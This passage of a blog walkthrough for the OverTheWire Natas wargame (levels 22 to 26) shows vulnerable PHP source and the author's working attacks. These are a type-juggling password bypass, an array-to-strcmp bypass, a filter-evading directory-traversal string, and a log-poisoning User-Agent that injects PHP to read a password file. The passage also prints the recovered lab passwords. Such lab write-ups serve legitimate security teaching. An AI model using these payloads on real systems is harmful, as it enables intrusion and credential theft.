<p>Well, it looks like all you have to do is pass a GET parameter named <em>revelio</em> and receive the password. But if you&rsquo;re not an admin, you will just be redirected to the same page via a Location header. I couldn&rsquo;t think of a way to fool the page that I&rsquo;m admin, but I tried messing with the headers,URL and session ID, with no success. However, when I just decided to look at the response to my request in Burp, the answer was in the HTML:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas23
</span><span class='line'>Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE&lt;/pre&gt;</span></code></pre></td></tr></table></div></figure>


<p>After receiving this response the browser made another request..but at this point it didn&rsquo;t matter :D</p>

<h3>Level 23</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas23.png" title="natas23" alt="natas 23"></p>

<p>Here we have to input a password to login. Let&rsquo;s see the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>    if(array_key_exists("passwd",$_REQUEST)){
</span><span class='line'>        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] &gt; 10 )){
</span><span class='line'>            echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
</span><span class='line'>            echo "&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;";
</span><span class='line'>        }
</span><span class='line'>        else{
</span><span class='line'>            echo "&lt;br&gt;Wrong!&lt;br&gt;";
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>    // morla / 10111
</span><span class='line'>?&gt;  </span></code></pre></td></tr></table></div></figure>


<p>We will get the credentials if we enter a password that contains the string <em>iloveyou</em> and that is larger than 10. But how can a string be compared to an integer? PHP manual to the rescue! According to the <a href="https://secure.php.net/manual/en/language.operators.comparison.php">Comparison Operators</a> section:</p>

<blockquote><p>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison
performed numerically.</p></blockquote>

<p><a href="https://secure.php.net/manual/en/language.types.string.php#language.types.string.conversion">So how is the string converted to a number?</a></p>

<blockquote><p>If the string does not contain any of the characters &lsquo;.&rsquo;, &lsquo;e&rsquo;, or &lsquo;E&rsquo; and the numeric value fits into integer type limits (as defined by
PHP_INT_MAX), the string will be evaluated as an integer. In all other cases it will be evaluated as a float.</p>

<p>The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the
value will be 0 (zero).</p></blockquote>

<p>So all we have to do is enter a password that starts with a number greater than 50, followed by the <em>iloveyou</em> string, something like <em>50iloveyou</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg</span></code></pre></td></tr></table></div></figure>


<p>// (I thought at the beginning that the comment was related to the challenge, but it turns out that&rsquo;s the handle of the creator of the challenge).</p>

<h3>Level 24</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas23.png" title="natas24" alt="natas 24"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;passwd&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">)){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;passwd&quot;</span><span class="p">],</span><span class="s2">&quot;&lt;censored&gt;&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// morla / 10111</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">  </span>
</span></code></pre></td></tr></table></div></figure>


<p>This level is centered around exploiting the <em>strcmp</em> function. This function takes 2 strings as arguments and performs a case sensitive, binary safe string comparison:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int strcmp ( string $str1 , string $str2 )
</span><span class='line'>Returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal. </span></code></pre></td></tr></table></div></figure>


<p>When reading the user contributed notes in the manual, I noticed the mention of the necessity for both parameters to be strings, otherwise the return values would be unexpected, especially if given something like an array. Then I searched for some more information about the subject, check <a href="http://turbochaos.blogspot.jp/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Chaotic Security blog</a> and the <a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet">OWASP PHP security cheatsheet</a>. If you pass an array to the function, it will return NULL, and PHP will treat it as a 0, hence fooling the code that you provided the correct password. So I did it like this: <a href="http://natas24.natas.labs.overthewire.org/?passwd">http://natas24.natas.labs.overthewire.org/?passwd</a>[]=pwn</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
</span><span class='line'>
</span><span class='line'>The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</span></code></pre></td></tr></table></div></figure>


<h3>Level 25</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas25.png" title="natas25" alt="natas 25"></p>

<p>Here we have a page with a quote that we can choose to view in English or German.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="c1">// cheers and &lt;3 to malvina</span>
</span><span class='line'>    <span class="c1">// - morla</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">setLanguage</span><span class="p">(){</span>
</span><span class='line'>        <span class="cm">/* language setup */</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;lang&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="nx">safeinclude</span><span class="p">(</span><span class="s2">&quot;language/&quot;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;lang&quot;</span><span class="p">]</span> <span class="p">))</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">safeinclude</span><span class="p">(</span><span class="s2">&quot;language/en&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">safeinclude</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="c1">// check for directory traversal</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;../&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="nx">logRequest</span><span class="p">(</span><span class="s2">&quot;Directory traversal attempt! fixing request.&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nv">$filename</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;../&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="c1">// dont let ppl steal our passwords</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;natas_webpass&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="nx">logRequest</span><span class="p">(</span><span class="s2">&quot;Illegal file access detected! Aborting!&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="c1">// add more checks...</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">listFiles</span><span class="p">(</span><span class="nv">$path</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$listoffiles</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span>
</span><span class='line'>                    <span class="nv">$listoffiles</span><span class="p">[]</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="nv">$listoffiles</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">logRequest</span><span class="p">(</span><span class="nv">$message</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="s2">&quot;[&quot;</span><span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H::i:s&quot;</span><span class="p">,</span><span class="nb">time</span><span class="p">())</span> <span class="o">.</span><span class="s2">&quot;]&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="nv">$log</span> <span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="nv">$log</span> <span class="o">.</span> <span class="s2">&quot; </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$message</span> <span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/natas25_&quot;</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span><span class="s2">&quot;.log&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$log</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>At first it would seem that we have to find a way to traverse to <code>/etc/natas_webpass</code> and read the password from there, however there is a check in the code to prevent us from going there. So I next looked at bypassing the LFI filter and played a bit in a PHP sandbox to see which injection would work against the filter. Finally, I was able to read the log file with this injection: <code>lang=&hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//tmp/natas25_6n8g6cuqkbuthmp8usvql1vej2.log</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[17.10.2015 14::02:27] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request." [17.10.2015 14::02:38] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request."
</span><span class='line'>Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80
</span><span class='line'>
</span><span class='line'>Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81
</span><span class='line'>
</span><span class='line'>Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82</span></code></pre></td></tr></table></div></figure>


<p>Excellent, now we&rsquo;re getting somewhere! The next technique we&rsquo;ll use to get the password is a log poisoning attack. Read more <a href="http://hackerforhire.com.au/apache-log-poisoning-with-local-file-inclusion/">here</a></p>

<p>If you look at the <em>logRequest</em> function you will see that it appends various information to a log file. Part of this information is under our control (the User Agent). By using the log poisoning attack, we can change the User Agent to some PHP code of our choosing, that will then get written to the log file when we do an action which should be logged. And when the server reads the log file, it will happily execute the code contained within. Let&rsquo;s see this in practice:</p>

<ul>
<li><p>I changed my user agent to <code>&lt;?php readfile(&lsquo;/etc/natas_webpass/natas26&rsquo;); ?></code></p></li>
<li><p>Then I refreshed the page where I was looking at the log file and among all the logged information was also the password:</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"Directory traversal attempt! fixing request." [17.10.2015 15::56:48] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T </span></code></pre></td></tr></table></div></figure>


<p>The password is <code>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</code></p>

<h3>Level 26</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas26.png" title="natas26" alt="natas 26"></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="c1">// sry, this is ugly as hell.</span>
</span><span class='line'>    <span class="c1">// cheers kaliman ;)</span>
</span><span class='line'>    <span class="c1">// - morla</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span><span class='line'>            <span class="c1">// initialise variables</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&quot;#--session started--#</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span><span class="s2">&quot;#--session end--#</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span> <span class="s2">&quot;/tmp/natas26_&quot;</span> <span class="o">.</span> <span class="nv">$file</span> <span class="o">.</span> <span class="s2">&quot;.log&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// write initial message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$initMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$msg</span><span class="p">){</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$msg</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// write exit message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">showImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="si">$filename</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">drawImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$img</span><span class="o">=</span><span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span><span class="mi">300</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
</span><span class='line'>
</span><span class='line'>            <span class="nv">$color</span><span class="o">=</span><span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
</span><span class='line'>            <span class="nx">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">],</span>
</span><span class='line'>                            <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">],</span> <span class="nv">$color</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;drawing&quot;</span><span class="p">]));</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)</span>
</span><span class='line'>                <span class="k">foreach</span><span class="p">(</span><span class="nv">$drawing</span> <span class="k">as</span> <span class="nv">$object</span><span class="p">)</span>
</span><span class='line'>                    <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
